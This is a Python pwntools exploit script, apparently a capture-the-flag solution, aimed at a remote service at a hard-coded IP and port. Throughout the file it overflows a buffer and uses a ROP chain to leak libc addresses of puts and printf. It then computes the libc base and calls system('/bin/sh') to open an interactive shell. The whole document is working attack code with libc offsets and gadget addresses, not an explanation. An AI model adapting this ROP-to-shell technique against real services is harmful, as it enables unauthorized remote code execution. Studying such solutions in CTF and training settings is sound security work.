#!/usr/bin/env python
import pwn

REMOTE_ADDR = "206.189.123.169"
REMOTE_PORT = "5005"

# specific to my terminal - st
pwn.context.terminal = ["st", "-e", "sh", "-c"]

# helper function
addr_to_offset = lambda num: pwn.cyclic_find(num.to_bytes(4, "little"))
build_rop = lambda *items: b"".join(map(pwn.p64, items))

# gadgets
GADGETS = {
    "pop rdi": 0x401243,
    "ret":     0x40101a,
}

OFFSETS = {
    "local": {
        "puts":   0x76ab0,
        "printf": 0x58230,
        "binsh":  0x18bb62,
        "system": 0x49de0,
    },
    "remote": {
        "puts":   0x875a0,
        "printf": 0x64e10,
        "binsh":  0x1b75aa,
        "system": 0x55410,
    },

}["remote" if pwn.args.REMOTE else "local"]


def get_challenge(elf):
    if pwn.args.REMOTE:
        chal = pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    elif pwn.args.GDB:
        chal = pwn.process(elf.path)
        pwn.gdb.attach(
            chal,
            """
            b * name + 67
            c
            """,
        )
    else:
        chal = pwn.process(elf.path)
    return chal


def leak_libc_function(challenge, elf, func):
    width = addr_to_offset(0x6161616b)
    padding = pwn.cyclic(width)

    ropchain = build_rop(
        GADGETS["pop rdi"],
        elf.got[func],
        elf.plt["puts"],
        #GADGETS["ret"],
        elf.symbols["main"],
    )
    exploit = padding + ropchain

    challenge.sendline(exploit)

    leak = int.from_bytes(
        challenge.recvline_contains(b"\x7f").replace(b"\r", b"")[-6:], "little"
    )

    pwn.log.info(f"Leaked libc {func} address: 0x{leak:x}")

    return leak


def call_system(challenge, elf, libc_base):
    width = addr_to_offset(0x6161616b)
    padding = pwn.cyclic(width)

    ropchain = build_rop(
        GADGETS["pop rdi"],
        libc_base + OFFSETS["binsh"],
        GADGETS["ret"],
        libc_base + OFFSETS["system"],
    )
    exploit = padding + ropchain

    challenge.sendline(exploit)


def solve():
    elf = pwn.ELF("./main")
    chal = get_challenge(elf)

    libc_puts = leak_libc_function(chal, elf, "puts")
    libc_printf = leak_libc_function(chal, elf, "printf")

    libc_base_puts = libc_puts - OFFSETS["puts"]
    libc_base_printf = libc_printf - OFFSETS["printf"]

    if libc_base_puts == libc_base_printf:
        libc_base = libc_base_puts
        pwn.log.info(f"Leaked libc base address: 0x{libc_base:x}")

        call_system(chal, elf, libc_base)

        chal.interactive()
    else:
        chal.close()
        print("Failed to exploit challenge.")


if __name__ == "__main__":
    solve()

